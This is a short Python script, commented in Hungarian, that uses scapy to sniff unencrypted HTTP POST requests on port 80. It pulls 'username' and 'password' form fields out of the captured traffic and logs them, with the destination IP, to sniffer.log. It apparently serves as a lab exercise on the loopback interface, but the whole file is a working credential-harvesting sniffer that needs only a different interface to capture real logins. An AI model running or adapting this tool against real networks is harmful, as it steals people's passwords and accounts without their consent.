import logging
from urllib.parse import parse_qs  # Szükséges a POST adatok szétbontásához

from scapy.all import sniff, get_if_list, Raw
from scapy.layers.http import HTTPRequest
from scapy.layers.inet import IP
from scapy.layers.inet6 import IPv6

# --- LOGGER BEÁLLÍTÁSA ---
logger = logging.getLogger("sniffer")  # A logger példányosítása a megadott névvel
logger.setLevel(logging.INFO)  # Naplózási küszöb beállítása INFO szintre

# JAVÍTÁS: Adjunk meg kódolást, hogy a speciális karakterek ne okozzanak hibát
file_handler = logging.FileHandler("sniffer.log", encoding='utf-8')  # Fájlkezelő létrehozása UTF-8-as kódolással
file_handler.setLevel(logging.INFO)  # A fájlba írás szintjének beállítása

formater = logging.Formatter("%(asctime)s - %(message)s")  # JAVÍTÁS: Adjunk hozzá időbélyeget a loghoz
file_handler.setFormatter(formater)  # A formátum hozzárendelése a fájlkezelőhöz
logger.addHandler(file_handler)  # A handler regisztrálása a loggerben


def packet_callback(packet):
    """Csomagfeldolgozó függvény, minden elkapott csomagnál meghívódik."""
    # print(packet.summary()) # Opcionális csomagösszegző kiírása

    if packet.haslayer(HTTPRequest):  # Csak a HTTP kérésekkel foglalkozunk
        req = packet[HTTPRequest]
        if req.Method and req.Method.decode() == "POST":  # Csak a POST (adatküldő) kéréseket szűrjük
            if packet.haslayer(Raw):  # Megnézzük, van-e nyers adat a csomagban
                # Adat dekódolása, a hibás karakterek figyelmen kívül hagyásával
                post_data = packet[Raw].load.decode("utf-8", errors="ignore")
                print(f"POST Data: {post_data}")  # Nyers adatok kiírása ellenőrzéshez

                ip = "N/A"  # Alapértelmezett érték az IP-nek
                if packet.haslayer(IP):  # IPv4 célcím kinyerése
                    ip = packet[IP].dst
                #elif packet.haslayer(IPv6):  # IPv6 célcím kinyerése
                 #   ip = packet[IPv6].dst

                # Ellenőrizzük, hogy a keresett mezők szerepelnek-e az adatban
                if "username" in post_data and "password" in post_data:
                    form_data = parse_qs(post_data)  # Szöveg szétbontása szótárrá (dict)

                    # JAVÍTÁS: A parse_qs listát ad vissza (pl. ['admin']), ezért kell a [0] index
                    user = form_data.get("username", ["N/A"])[0]  # Felhasználónév kinyerése
                    password = form_data.get("password", ["N/A"])[0]  # Jelszó kinyerése

                    msg = f"Target: {ip} | User: {user} | Pass: {password}"  # Log üzenet összeállítása
                    logger.info(msg)  # Mentés a sniffer.log fájlba
                    print(f"[!] Adatok mentve: {msg}")  # Visszajelzés a konzolon


if __name__ == "__main__":
    print("Elérhető interfészek:", get_if_list())  # Interfészek listázása Fedorán
    print("Sniffer indítása a 'lo' (localhost) interfészen...")  # Tájékoztató szöveg

    # FIGYELEM: A sniff futtatásához sudo jog kell Linuxon!
    # store=0 használata javasolt, hogy ne teljen meg a RAM hosszú futásnál
    sniff(iface="lo", prn=packet_callback, filter="tcp port 80", store=0)  # Szimatolás indítása 80-as porton